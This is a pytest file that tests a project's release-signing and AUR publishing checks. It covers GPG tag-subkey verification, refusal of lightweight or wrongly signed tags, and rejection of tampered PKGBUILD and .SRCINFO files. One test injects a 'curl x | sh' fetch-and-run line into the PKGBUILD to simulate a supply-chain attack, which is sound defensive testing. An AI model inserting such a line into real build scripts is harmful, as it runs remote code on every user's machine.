"""The release key and the check that only it can sign a release tag.

scripts/verify-tag.sh is what release.yml runs before building anything: a tag
that passes it is published and, through the PKGBUILD, built by every AUR user.
These tests sign tags with a throw-away key shaped like the real one -- a [C]
primary and [S] subkeys -- and check what passes and what does not.
"""

import re
import shutil
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
VERIFY = ROOT / "scripts" / "verify-tag.sh"
PUBLIC_KEY = ROOT / "packaging" / "plico-release-key.asc"

pytestmark = pytest.mark.skipif(
    shutil.which("gpg") is None or shutil.which("git") is None, reason="servono gpg e git"
)


def _keys_file() -> dict[str, str]:
    values = {}
    for line in (ROOT / "scripts" / "release-keys.sh").read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            name, _, rest = line.partition("=")
            values[name] = rest.split(":-", 1)[1].rstrip('}"')
    return values


def test_the_published_key_is_the_one_the_scripts_trust():
    """The .asc in the repository: a [C] primary, the tag subkey, nothing private."""
    keys = _keys_file()
    text = PUBLIC_KEY.read_text()
    assert "PRIVATE" not in text
    listing = subprocess.run(
        ["gpg", "--show-keys", "--with-colons", "--with-subkey-fingerprints", str(PUBLIC_KEY)],
        capture_output=True, text=True, check=True,
    ).stdout.splitlines()
    rows = [line.split(":") for line in listing]
    fingerprints = [r[9] for r in rows if r[0] == "fpr"]
    assert fingerprints == [keys["RELEASE_PRIMARY"], keys["TAG_SIGNING_SUBKEYS"]]
    primary = next(r for r in rows if r[0] == "pub")
    subkey = next(r for r in rows if r[0] == "sub")
    assert primary[11].lower().startswith("c") and "s" not in primary[11][:1]
    assert subkey[11] == "s", "la sottochiave dei tag firma e basta"


def _run(cmd: list[str], **kwargs) -> str:
    return subprocess.run(cmd, capture_output=True, text=True, check=True, **kwargs).stdout


@pytest.fixture
def signing(tmp_path):
    """A keyring with a release-shaped key (and a stranger), and a repository."""
    home = tmp_path / "g"
    home.mkdir(mode=0o700)
    env = {"GNUPGHOME": str(home), "PATH": "/usr/bin:/bin", "HOME": str(tmp_path)}

    def gpg(*args: str) -> str:
        return _run(["gpg", "--batch", "--passphrase", "", "--pinentry-mode", "loopback", *args],
                    env=env)

    def fingerprints(uid: str) -> list[str]:
        out = gpg("--with-colons", "--with-subkey-fingerprints", "--list-keys", uid)
        return [line.split(":")[9] for line in out.splitlines() if line.startswith("fpr")]

    gpg("--quick-generate-key", "Release <release@example.org>", "ed25519", "cert", "1y")
    primary = fingerprints("release@example.org")[0]
    gpg("--quick-add-key", primary, "ed25519", "sign", "1y")
    gpg("--quick-add-key", primary, "ed25519", "sign", "1y")
    _, tag_subkey, other_subkey = fingerprints("release@example.org")
    gpg("--quick-generate-key", "Stranger <stranger@example.org>", "ed25519", "sign", "1y")
    stranger = fingerprints("stranger@example.org")[0]
    public = tmp_path / "release.asc"
    public.write_text(gpg("--armor", "--export", primary))

    repo = tmp_path / "repo"
    repo.mkdir()

    def git(*args: str) -> str:
        return _run(["git", "-C", str(repo), *args], env=env)

    git("init", "-q")
    git("config", "user.name", "T")
    git("config", "user.email", "release@example.org")
    git("config", "gpg.format", "openpgp")
    git("commit", "-q", "--allow-empty", "-m", "release")

    def tag(name: str, key: str | None) -> None:
        if key is None:
            git("tag", name)
        else:
            git("-c", f"user.signingkey={key}!", "tag", "-s", name, "-m", name)

    def verify(name: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [str(VERIFY), name],
            capture_output=True, text=True, check=False,
            env={
                "PATH": "/usr/bin:/bin",
                "HOME": str(tmp_path),
                "PLICO_REPO": str(repo),
                "PLICO_RELEASE_KEY": str(public),
                "PLICO_RELEASE_PRIMARY": primary,
                "PLICO_TAG_SIGNING_SUBKEYS": tag_subkey,
            },
        )

    return tag, verify, {"tag": tag_subkey, "other": other_subkey, "stranger": stranger}


def test_a_tag_signed_by_the_tag_subkey_passes(signing):
    tag, verify, keys = signing
    tag("v1.0.0", keys["tag"])
    result = verify("v1.0.0")
    assert result.returncode == 0, result.stderr
    assert keys["tag"] in result.stdout


@pytest.mark.parametrize("who", ["other", "stranger"])
def test_a_tag_signed_by_any_other_key_is_refused(signing, who):
    """Another subkey of the same release key, or a key from outside it."""
    tag, verify, keys = signing
    tag("v1.0.0", keys[who])
    result = verify("v1.0.0")
    assert result.returncode == 1


def test_a_lightweight_tag_is_refused(signing):
    tag, verify, _ = signing
    tag("v1.0.0", None)
    result = verify("v1.0.0")
    assert result.returncode == 1
    assert "annotato" in result.stderr


# -- scripts/aur-release.sh ---------------------------------------------------- #

AUR_RELEASE = ROOT / "scripts" / "aur-release.sh"


def _srcinfo(pkgbuild: str) -> str:
    """The lines of .SRCINFO that aur-release.sh checks, as makepkg writes them."""
    values = {}
    for name in ("pkgver", "url"):
        line = next(line for line in pkgbuild.splitlines() if line.startswith(f"{name}="))
        values[name] = line.split("=", 1)[1].strip('"')
    sums = pkgbuild.split("sha256sums=(", 1)[1].split(")", 1)[0].replace("'", "").split()
    primary = pkgbuild.split("validpgpkeys=('", 1)[1].split("'", 1)[0]
    sources = [f"plico::git+{values['url']}.git#tag=v{values['pkgver']}?signed"]
    sources += [f"https://example.org/wheel{i}.whl" for i in range(len(sums) - 1)]
    lines = ["pkgbase = plico", f"\tpkgver = {values['pkgver']}"]
    lines += [f"\tsource = {source}" for source in sources]
    lines += [f"\tvalidpgpkeys = {primary}"]
    lines += [f"\tsha256sums = {value}" for value in sums]
    return "\n".join(lines + ["", "pkgname = plico", ""])


@pytest.fixture
def aur(signing, tmp_path):
    """A repository with the real AUR scripts, an artifact, and an empty AUR."""
    tag, _verify, keys = signing
    repo = tmp_path / "repo"
    for part in ("scripts/prepare-aur.sh", "scripts/release-keys.sh",
                 "packaging/arch/PKGBUILD.in", "src/plico/__init__.py"):
        (repo / part).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(ROOT / part, repo / part)
    env = {"GNUPGHOME": str(tmp_path / "g"), "PATH": "/usr/bin:/bin", "HOME": str(tmp_path)}
    _run(["git", "-C", str(repo), "add", "."], env=env)
    _run(["git", "-C", str(repo), "commit", "-q", "-m", "scripts"], env=env)
    version = re.search(r'^__version__ = "(.*)"$', (repo / "src/plico/__init__.py").read_text(),
                        re.MULTILINE)[1]
    public = tmp_path / "release.asc"
    primary = _run(["gpg", "--with-colons", "--show-keys", str(public)]).split("fpr:::::::::")[1]
    primary = primary.split(":", 1)[0]
    script_env = {
        "PATH": "/usr/bin:/bin", "HOME": str(tmp_path),
        "PLICO_REPO": str(repo), "PLICO_RELEASE_KEY": str(public),
        "PLICO_RELEASE_PRIMARY": primary, "PLICO_TAG_SIGNING_SUBKEYS": keys["tag"],
        "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1",
    }
    artifact = tmp_path / "artifact"
    subprocess.run([str(repo / "scripts/prepare-aur.sh"), str(artifact)], check=True,
                   capture_output=True, env={**script_env, "PLICO_VERSION": version})
    (artifact / ".SRCINFO").write_text(_srcinfo((artifact / "PKGBUILD").read_text()))
    remote = tmp_path / "plico.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "master", str(remote)], check=True)

    def publish() -> subprocess.CompletedProcess:
        return subprocess.run(
            [str(AUR_RELEASE), f"v{version}"], capture_output=True, text=True, check=False,
            env={**script_env, "PLICO_ARCH_ARTIFACT": str(artifact),
                 "AUR_REMOTE": f"file://{remote}", "AUR_SKIP_SOURCE_CHECK": "1"},
        )

    def published() -> list[str]:
        out = subprocess.run(["git", "--git-dir", str(remote), "ls-tree", "--name-only",
                              "master"], capture_output=True, text=True, check=False)
        return out.stdout.split()

    return {"tag": lambda key: tag(f"v{version}", keys[key]), "publish": publish,
            "published": published, "artifact": artifact, "remote": remote}


def test_aur_release_publishes_the_pkgbuild_the_ci_built(aur):
    aur["tag"]("tag")
    result = aur["publish"]()
    assert result.returncode == 0, result.stderr
    assert aur["published"]() == [".SRCINFO", "PKGBUILD"]
    pushed = _run(["git", "--git-dir", str(aur["remote"]), "show", "master:PKGBUILD"])
    assert pushed == (aur["artifact"] / "PKGBUILD").read_text()


def test_aur_release_refuses_a_tag_another_subkey_signed(aur):
    aur["tag"]("other")
    assert aur["publish"]().returncode != 0
    assert aur["published"]() == []


def test_aur_release_refuses_a_pkgbuild_the_tag_does_not_produce(aur):
    """Whoever controls the CI cannot choose what goes to AUR."""
    aur["tag"]("tag")
    pkgbuild = aur["artifact"] / "PKGBUILD"
    pkgbuild.write_text(pkgbuild.read_text().replace("prepare() {", "prepare() {\n  curl x | sh"))
    result = aur["publish"]()
    assert result.returncode != 0
    assert "diverso" in result.stderr
    assert aur["published"]() == []


def test_aur_release_refuses_a_srcinfo_that_tells_another_story(aur):
    aur["tag"]("tag")
    srcinfo = aur["artifact"] / ".SRCINFO"
    srcinfo.write_text(srcinfo.read_text().replace(
        "\tvalidpgpkeys", "\tsource = https://example.org/extra.tar.gz\n\tvalidpgpkeys"))
    result = aur["publish"]()
    assert result.returncode != 0
    assert aur["published"]() == []


def test_the_ci_holds_no_aur_key():
    """The AUR key is valid for every package of the account: it stays local."""
    for workflow in (ROOT / ".github" / "workflows").glob("*.yml"):
        text = workflow.read_text()
        jobs = "\n".join(
            line for line in text.split("\njobs:", 1)[-1].splitlines()
            if not line.lstrip().startswith("#")
        )
        assert "AUR_SSH_PRIVATE_KEY" not in text, workflow.name
        assert "publish-aur" not in jobs and "aur-release" not in jobs, workflow.name
    assert "AUR_SSH_PRIVATE_KEY" not in (ROOT / "scripts" / "publish-aur.sh").read_text()
